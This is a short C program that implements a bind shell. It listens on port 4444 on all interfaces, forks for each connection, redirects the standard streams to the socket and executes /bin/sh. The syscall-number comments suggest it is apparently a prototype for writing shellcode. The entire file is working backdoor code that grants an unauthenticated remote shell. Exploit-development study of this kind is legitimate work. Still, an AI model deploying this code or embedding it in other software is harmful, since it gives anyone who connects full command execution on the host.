#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main(void) {
  int c=2;
  int sock, csock;
  struct sockaddr_in srv;
  pid_t procid;

  // socket()
  // #define __NR_socketcall 102  (/usr/include/asm/unistd_32.h)
  // #define SYS_SOCKET      1    (/usr/include/linux/net.h)
  // sock = socket(AF_INET, SOCK_STREAM, 0);
  sock = socket(2, 1, 0);

  //srv.sin_family = AF_INET;
  srv.sin_family = 2;
  srv.sin_port = htons(4444);
  //srv.sin_addr.s_addr = INADDR_ANY;
  srv.sin_addr.s_addr = 0;

  // bind()
  // #define __NR_socketcall 102
  // #define SYS_BIND        2
  // bind(sock, (struct sockaddr *) &srv, sizeof(srv));
  bind(sock, (struct sockaddr *) &srv, 16);

  // listen()
  // #define SOMAXCONN       128  (/usr/include/bits/socket.h)
  // listen(sock, SOMAXCONN);
  listen(sock, 128);

  while (1) {
    // accept()
    // #define __NR_socketcall 102
    // #define SYS_ACCEPT      5
    csock = accept(sock, 0, 0);

    // fork()
    // #define __NR_fork 2
    procid = fork();
    if (procid == 0) {
      // In the child now

      // close()
      // #define __NR_close 6
      close(sock);

      // dup2()
      // #define __NR_dup2 63
      // dup2(csock, STD*_FILENO);
      while (c>=0) {
        dup2(csock, c);
        c--;
      }
      // execve()
      // #define __NR_execve 11
      execve("/bin/sh",0,0);
    }
    else {
      close(csock);
    }
  }
}
